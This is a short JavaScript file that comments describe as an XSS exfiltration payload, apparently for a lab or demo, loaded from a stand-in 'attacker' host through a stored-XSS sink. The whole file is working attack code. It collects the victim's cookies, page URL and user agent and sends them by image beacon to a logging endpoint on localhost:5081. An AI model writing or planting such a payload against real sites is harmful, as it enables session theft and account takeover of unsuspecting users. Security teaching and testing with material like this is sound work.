// Exfiltration payload. Loaded by <script src="http://attacker:5081/steal.js">
// if the attacker manages to inject a script tag via the stored-XSS sink.
(function () {
  try {
    var data = {
      cookie: document.cookie,
      url: location.href,
      ua: navigator.userAgent
    };
    var img = new Image();
    img.src = "http://localhost:5081/log?d=" + encodeURIComponent(JSON.stringify(data));
  } catch (e) { /* ignore */ }
})();
